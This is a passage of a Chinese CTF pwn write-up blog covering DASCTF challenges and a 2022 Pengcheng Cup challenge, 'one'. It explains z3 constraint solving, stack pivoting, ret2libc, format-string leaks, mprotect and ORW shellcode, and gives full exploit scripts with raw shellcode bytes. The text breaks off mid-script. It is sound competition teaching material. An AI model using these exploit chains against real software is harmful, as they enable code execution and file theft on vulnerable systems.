<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v3=Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4=Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5=Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6=Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7=Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8=Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9=Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v10=Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v11=Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12=Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">v13=Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">v14=Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">v15=Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">v16=Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">v17=Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line">v18=Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v17 + v16 * v15) * v18 == <span class="number">0x11376</span>)</span><br><span class="line">s.add(v5 * v4 * v3 - v6 == <span class="number">0x8D56</span>)</span><br><span class="line">s.add(v3 == <span class="number">0x13</span>)</span><br><span class="line">s.add(v5 * <span class="number">0x13</span> * v4 + v6 == <span class="number">0x8DE2</span>)</span><br><span class="line">s.add((v13 + v3 - v8) * v16 == <span class="number">0x8043</span>)</span><br><span class="line">s.add((v4 * v3 - v5) * v6 == <span class="number">0xAC8A</span>)</span><br><span class="line">s.add((v5 + v4 * v3) * v6 == <span class="number">0xC986</span>)</span><br><span class="line">s.add(v9 * v8 * v7 - v10 == <span class="number">0xF06D</span>)</span><br><span class="line">s.add(v10 * v15 + v4 + v18 == <span class="number">0x4A5D</span>)</span><br><span class="line">s.add(v9 * v8 * v7 + v10 == <span class="number">0xF1AF</span>)</span><br><span class="line">s.add((v8 * v7 - v9) * v10 == <span class="number">0x8E03D</span>)</span><br><span class="line">s.add(v11 == <span class="number">0x32</span>)</span><br><span class="line">s.add((v9 + v8 * v7) * v10 == <span class="number">0x8F59F</span>)</span><br><span class="line">s.add(v13 * v12 * v11 - v14 == <span class="number">0x152FD3</span>)</span><br><span class="line">s.add(v13 * v12 * v11 + v14 == <span class="number">0x15309D</span>)</span><br><span class="line">s.add((v12 * v11 - v13) * v14 == <span class="number">0x9C48A</span>)</span><br><span class="line">s.add((v11 * v5 - v16) * v12 == <span class="number">0x4E639</span>)</span><br><span class="line">s.add((v13 + v12 * v11) * v14 == <span class="number">0xA6BD2</span>)</span><br><span class="line">s.add(v17 * v16 * v15 - v18 == <span class="number">0x8996D</span>)</span><br><span class="line">s.add(v17 * v16 * v15 + v18 == <span class="number">0x89973</span>)</span><br><span class="line">s.add(v14 == <span class="number">0x65</span>)</span><br><span class="line">s.add((v16 * v15 - v17) * v18 == <span class="number">0x112E6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>



<p>求解后的值</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021907794.png" alt="image-20230202190705641" style="zoom:50%;" />



<p>上述栈迁移后，执行的是栈里的 <code>rop</code> ，因为 <code>rdx</code> 是一个比较大的值，所以直接调用 <code>read</code> 函数向 <code>bss</code> 段写入数据（这个地址找高点，不然之后执行 <code>system</code> 函数开辟栈帧可能会覆盖一些其他指针），然后程序中是存在这个  <code>pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code> ,利用这个 <code>gadget</code> 可以再进行一次栈迁移（因为栈里无法布置太长的 <code>rop</code> 链，只能迁移到 <code>bss</code> 段上）</p>
<p>迁移到 <code>bss</code> 段上后再打一次 <code>ret2libc</code> 即可</p>
<p><strong>注意：</strong> 因为栈随机化的原因，<code>rbp</code> 的末尾覆盖为 <code>\x00</code> 后，不是一定能指向 <code>rop</code> 链的开始部分，而是在一个区域内随机的，所以在 <code>rop</code> 上面写满 <code>ret</code> 指令，滑到 <code>rop</code> 链上成功的概率会大一点。</p>
<p>放几张调试时的图片</p>
<p>下面是执行到 <code>puts(&quot;good done&quot;)</code> 时，栈中的情况，可以看到返回地址已经变成了 <code>nop ; leave ; ret</code> 的地址， <code>rbp</code> 指向了上面 <code>ret</code> 的部分，而 <code>ret</code> 下面就是 <code>rop链</code> ，该 <code>rop</code> 链是向 <code>bss</code> 段写入 <code>ret2libc</code> 的 <code>payload</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021938029.png" alt="image-20230202193808421"></p>
<p>第二次栈迁移</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021941345.png" alt="image-20230202194109919"></p>
<p>执行 <code>puts</code> 函数泄露 <code>libc</code> 地址，此时栈已经迁移到了 <code>bss</code> 段上</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021942043.png" alt="image-20230202194207428" style="zoom:50%;" />



<p>最后触发 <code>system</code> 函数，获取 <code>shell</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943748.png" alt="image-20230202194320318"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021943035.png" alt="image-20230202194345788"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:21323&quot;</span>)</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">19</span></span><br><span class="line">v11 = <span class="number">50</span></span><br><span class="line">v14 = <span class="number">101</span></span><br><span class="line">v18 = <span class="number">3</span></span><br><span class="line">v10 = <span class="number">161</span></span><br><span class="line">v12 = <span class="number">131</span></span><br><span class="line">v5 = <span class="number">53</span></span><br><span class="line">v16 = <span class="number">199</span></span><br><span class="line">v7 = <span class="number">55</span></span><br><span class="line">v9 = <span class="number">17</span></span><br><span class="line">v15 = <span class="number">118</span></span><br><span class="line">v17 = <span class="number">24</span></span><br><span class="line">v6 = <span class="number">70</span></span><br><span class="line">v4 = <span class="number">36</span></span><br><span class="line">v13 = <span class="number">212</span></span><br><span class="line">v8 = <span class="number">66</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400ca3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400ca1</span></span><br><span class="line">bss_addr=<span class="number">0x602510</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x0000000000400c9d</span></span><br><span class="line">ret=<span class="number">0x400C3E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">rop+=p64(bss_addr-<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;\x32\x33&#x27;</span>+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">86</span>-<span class="number">0x40</span>) <span class="comment">#206</span></span><br><span class="line">pay+=p64(ret)*<span class="number">0xf</span></span><br><span class="line">pay+= rop</span><br><span class="line"></span><br><span class="line">pay += p8(v3)</span><br><span class="line">pay += p8(v4)</span><br><span class="line">pay += p8(v5)</span><br><span class="line">pay += p8(v6)</span><br><span class="line">pay += p8(v7)</span><br><span class="line">pay += p8(v8)</span><br><span class="line">pay += p8(v9)</span><br><span class="line">pay += p8(v10)</span><br><span class="line">pay += p8(v11)</span><br><span class="line">pay += p8(v12)</span><br><span class="line">pay += p8(v13)</span><br><span class="line">pay += p8(v14)</span><br><span class="line">pay += p8(v15)</span><br><span class="line">pay += p8(v16)</span><br><span class="line">pay += p8(v17)</span><br><span class="line">pay += p8(v18)</span><br><span class="line">pay+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0xe0</span>-<span class="number">4</span>)+<span class="string">b&#x27;\x38\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x400BA6</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;:&#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">rop2=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop2+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x48</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop2+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">p.sendline(rop2)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rop1=p64(<span class="number">0x400BB8</span>)+p64(pop_rdi)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h2><p>这个题格式化字符串漏洞泄露栈地址和 <code>libc</code> 地址，然后栈迁移再打 <code>mprotect</code> 函数和 <code>orw</code> 的 <code>shellcode</code> 即可， 比较简单就不写过程了 </p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn1&quot;</span>,<span class="string">&quot;tcp.cloud.dasctf.com:20516&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%p%31$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x40138C</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401413</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401411</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rop=p64(pop_rdi)+p64(stack_addr&amp;<span class="number">0xfffffffffff000</span>)</span><br><span class="line">rop+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rdx_ret)+p64(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">rop+=p64(libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x58</span>)<span class="comment">#48</span></span><br><span class="line">rop+=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xb0</span>-<span class="number">60</span>-<span class="number">0x48</span>)</span><br><span class="line">rop+=p64(stack_addr+<span class="number">0x10</span>-<span class="number">8</span>)</span><br><span class="line">rop+=p64(<span class="number">0x4013A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Now, please say something to DASCTF:\n&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302021952429.png" alt="image-20230202195232240"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>orw</tag>
        <tag>栈迁移</tag>
        <tag>求解方程组</tag>
        <tag>ret2libc</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>2022鹏城杯 pwn--one--wp</title>
    <url>/posts/69f62957.html</url>
    <content><![CDATA[<p>这次比赛由于本人较菜，只做出了一道格式化字符串的那道题（比赛24个小时，这道题我打了18个小时，是真菜），在知道roderick师傅三小时做了四道题之后，就感觉自己更菜了  o(╥﹏╥)o 然后由于堆题的libc版本都很高，所以暂时先没打算复现（主要菜狗才刚把低版本libc的堆基础漏洞学完）</p>
<span id="more"></span>

<p>这里就记录一下one这道题的解题过程(我最开始自己做的用的方法很麻烦，我主要讲roderick师傅的解题思路吧，文末记录一下我最开始的方法)</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012005677.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012005678.png"></p>
<h2 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012005679.png"></p>
<p>首先这道题自己泄露了栈地址。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012005680.png"></p>
<p>然后在login函数中，如果把s装满，那%s就可以泄露出一个程序地址，此时得到了程序基地址(以此来对抗PIE保护)，接着就是存在一个格式化字符串漏洞（不过只能执行一次）</p>
<p>然后对抗沙箱保护，采用的方式是orw读出flag，但是close(1)给读出flag造成了一些困扰，对抗措施是将stdout重定向到IO_2_1_stderr让程序重新具有回显。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>由于有栈地址和程序基地址，所以这道题利用起来也不难，只要将stdout重定向一下，再获取一下libc地址，打orw即可。</p>
<p>先考虑如何控制程序执行流</p>
<p>我们是知道栈地址的，而且read读入了0x200的数据，这个数据量可以做很多事情，所以考虑用格式化字符串来实现栈迁移去执行我们布置到栈上的rop链。</p>
<p>rop链先考虑用magic gadget(<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">magic gadget我这篇文章具体介绍了</a>)去将stdout重定向到IO_2_1_stderr，然后利用gadget片段去执行puts函数泄露libc地址(因为此时标准输出已经重启)，接着用csu中的gadget片段执行read函数，再次布置一条rop链。</p>
<p>先说第一条rop链吧。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure>

<p>这里建议使用fmtstr_payload这个模块，不然手写的话非常难受，因为一次只能写入0x2000的字节（因为标准输出被关闭了，更深层次原因未知），这就意味着一次只能改写一个字节。把栈地址一字节一字节写入的话，还需要考虑每个字节的大小。如果实现的话如下（也可能还有更简单的实现方法，但是比赛的时候我这个菜菜是这么做的）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(list_sort)</span><br><span class="line"><span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br></pre></td></tr></table></figure>

<p>所以还是建议比赛的时候用工具(但是不能只会用工具)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure>

<p>这部分就是传参执行了一次magic gadget，一次puts,一次read函数。</p>
<p>然后因为要执行流要衔接到第二次rop链上，这就很考验read到底把数据精准写到哪。完全可以通过调试来看一下执行流最终到了哪个栈地址，不过在输入的字节数很充裕的情况下可以直接布置很多的ret指令，来往下滑，滑到rop链上。这次的rop链采用的是执行mprotect函数，将栈区变成可执行的，然后打shellcode获取flag。</p>
<p>下面是第二次的rop链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)<span class="comment">#这里要垫一个shellcode的地址，然后用ret去执行</span></span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure>



<h2 id="完整EXP："><a href="#完整EXP：" class="headerlink" title="完整EXP："></a>完整EXP：</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> load,log_addr,log,debug</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">code_base=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line"><span class="comment">#log_addr(&#x27;code_base&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr=code_base+<span class="number">0x1543</span></span><br><span class="line">magic_addr=code_base+<span class="number">0x1272</span></span><br><span class="line">rbp_addr=leak_stack_addr+<span class="number">0x810</span></span><br><span class="line">pop_rbx_rbp=code_base+<span class="number">0x153A</span></span><br><span class="line">stdout=code_base+<span class="number">0x4020</span></span><br><span class="line">magic_offset=libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x1ed6a0</span> +<span class="number">0x1000000000000000</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x153A)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr+0x120&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr+<span class="number">0x120</span>))</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes=&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">pop_rsi_addr=libc_base_addr+<span class="number">0x2601f</span></span><br><span class="line">pop_rdx_addr=libc_base_addr+<span class="number">0x142c92</span></span><br><span class="line">mprotect=libc_base_addr+<span class="number">0x1189a0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span 